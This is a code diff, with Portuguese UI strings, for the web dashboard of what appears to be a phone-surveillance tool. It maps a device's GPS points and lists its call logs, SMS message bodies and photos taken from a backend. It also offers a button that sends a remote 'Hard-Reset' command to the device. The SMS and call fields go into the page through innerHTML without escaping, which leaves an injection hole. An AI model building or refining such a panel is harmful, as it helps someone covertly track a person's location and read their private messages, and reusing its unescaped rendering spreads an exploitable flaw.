@@ -1,76 +1,114 @@
-const API = window.location.origin + '/api';
-const token = localStorage.getItem('token');
-if (!token) location.href = 'index.html';
-
-const logoutBtn    = document.getElementById('logout');
-const refreshBtn   = document.getElementById('refresh');
-const hardResetBtn = document.getElementById('hardReset');
-
-logoutBtn.onclick = () => {
-  localStorage.removeItem('token');
-  location.href = 'index.html';
-};
-refreshBtn.onclick = loadData;
-hardResetBtn.onclick = async () => {
-  const user = JSON.parse(atob(token.split('.')[1])).username;
-  await fetch(`${API}/command/${user}`, {
-    method: 'POST',
-    headers: { Authorization: 'Bearer ' + token }
-  });
-  alert('Hard-Reset enviado');
-};
-
-let map, markers = [];
 document.addEventListener('DOMContentLoaded', () => {
-  map = L.map('map').setView([0, 0], 2);
+  const API = window.location.origin + '/api';
+  const token = localStorage.getItem('token');
+  const msgDiv = document.getElementById('msg');
+  const logoutBtn = document.getElementById('logout');
+  const refreshBtn = document.getElementById('refresh');
+  const hardResetBtn = document.getElementById('hardReset');
+
+  if (!token) {
+    msgDiv.textContent = 'Não autenticado. Redirecionando…';
+    return setTimeout(() => window.location = 'index.html', 1000);
+  }
+
+  logoutBtn.onclick = () => {
+    localStorage.removeItem('token');
+    window.location = 'index.html';
+  };
+  refreshBtn.onclick = loadData;
+  hardResetBtn.onclick = async () => {
+    const user = JSON.parse(atob(token.split('.')[1])).username;
+    try {
+      const res = await fetch(`${API}/command/${encodeURIComponent(user)}`, {
+        method: 'POST',
+        headers: { Authorization: 'Bearer ' + token }
+      });
+      const json = await res.json();
+      alert('Hard-Reset enviado: ' + JSON.stringify(json));
+    } catch (e) {
+      alert('Erro no hard-reset: ' + e.message);
+    }
+  };
+
+  // inicializa o mapa
+  let map = L.map('map').setView([0, 0], 2);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
     attribution: '© OpenStreetMap'
   }).addTo(map);
+
   loadData();
-});
 
-async function loadData() {
-  markers.forEach(m=>map.removeLayer(m));
-  markers = [];
-  document.querySelector('#callsTable tbody').innerHTML = '';
-  document.querySelector('#smsTable tbody').innerHTML   = '';
-  document.getElementById('photos').innerHTML           = '';
+  async function loadData() {
+    msgDiv.textContent = 'Buscando dados…';
+    try {
+      const res = await fetch(`${API}/data`, {
+        headers: { Authorization: 'Bearer ' + token }
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      const pts = await res.json();
 
-  const res = await fetch(`${API}/data`, {
-    headers: { Authorization: 'Bearer ' + token }
-  });
-  const pts = await res.json();
-  if (!pts.length) return alert('Nenhum dado disponível.');
+      if (!pts.length) {
+        msgDiv.textContent = 'Nenhum dado disponível.';
+        return;
+      }
 
-  pts.forEach(entry => {
-    const { lat, lng, date } = entry.location;
-    const marker = L.marker([lat, lng]).addTo(map)
-      .bindPopup(`Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>${new Date(date).toLocaleString()}`);
-    markers.push(marker);
+      // limpa marcadores, tabelas, fotos
+      map.eachLayer(layer => {
+        if (layer instanceof L.Marker) map.removeLayer(layer);
+      });
+      document.querySelector('#callsTable tbody').innerHTML = '';
+      document.querySelector('#smsTable tbody').innerHTML = '';
+      document.getElementById('photos').innerHTML = '';
 
-    entry.calls.forEach(c => {
-      const tr = `<tr>
-        <td>${c.number}</td><td>${c.type}</td>
-        <td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td>
-      </tr>`;
-      document.querySelector('#callsTable tbody').innerHTML += tr;
-    });
+      // plota cada ponto
+      pts.forEach(entry => {
+        const loc = entry.location;
+        if (loc && loc.lat != null) {
+          const marker = L.marker([loc.lat, loc.lng]).addTo(map);
+          marker.bindPopup(
+            `Lat: ${loc.lat.toFixed(5)}, Lng: ${loc.lng.toFixed(5)}<br>` +
+            `Hora: ${new Date(loc.date || entry.timestamp).toLocaleString()}`
+          );
+        }
 
-    entry.sms.forEach(s => {
-      const tr = `<tr>
-        <td>${s.from}</td><td>${s.body}</td>
-        <td>${new Date(s.date).toLocaleString()}</td>
-      </tr>`;
-      document.querySelector('#smsTable tbody').innerHTML += tr;
-    });
+        // chamadas
+        entry.calls.forEach(call => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td>${call.number}</td>
+            <td>${call.type}</td>
+            <td>${call.duration}</td>
+            <td>${new Date(call.date).toLocaleString()}</td>
+          `;
+          document.querySelector('#callsTable tbody').appendChild(tr);
+        });
 
-    if (entry.photo) {
-      const img = document.createElement('img');
-      img.src = 'data:image/jpeg;base64,' + entry.photo;
-      document.getElementById('photos').appendChild(img);
+        // SMS
+        entry.sms.forEach(sms => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td>${sms.from}</td>
+            <td>${sms.body}</td>
+            <td>${new Date(sms.date).toLocaleString()}</td>
+          `;
+          document.querySelector('#smsTable tbody').appendChild(tr);
+        });
+
+        // fotos (base64)
+        if (entry.photo) {
+          const img = document.createElement('img');
+          img.src = 'data:image/jpeg;base64,' + entry.photo;
+          document.getElementById('photos').appendChild(img);
+        }
+      });
+
+      // ajustar view para o primeiro ponto
+      const f = pts[0].location;
+      map.setView([f.lat, f.lng], 12);
+
+      msgDiv.style.display = 'none';
+    } catch (e) {
+      msgDiv.textContent = 'Erro ao carregar: ' + e.message;
     }
-  });
-
-  const first = pts[0].location;
-  map.setView([first.lat, first.lng], 13);
-              }
+  }
+});
